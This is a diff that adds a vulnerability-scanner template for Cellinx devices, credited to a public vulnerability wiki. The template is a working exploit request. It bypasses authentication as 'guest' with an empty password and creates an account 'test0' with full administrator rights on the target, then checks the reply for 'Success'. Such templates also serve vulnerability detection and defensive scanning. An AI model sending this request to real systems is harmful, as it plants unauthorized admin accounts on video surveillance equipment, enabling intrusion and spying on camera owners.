@@ -1,0 +1,14 @@
+name: cellinx-auth-bypass
+rules:
+  - method: POST
+    path: "/cgi-bin/UAC.cgi?TYPE=json"
+    headers:
+      Content-Type: application/json
+    body: '{"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"test0","password":"test312","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}'
+    expression: |
+      response.status == 200 && response.body.bcontains(b"Success")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "Cellinx 认证绕过+用户创建漏洞"
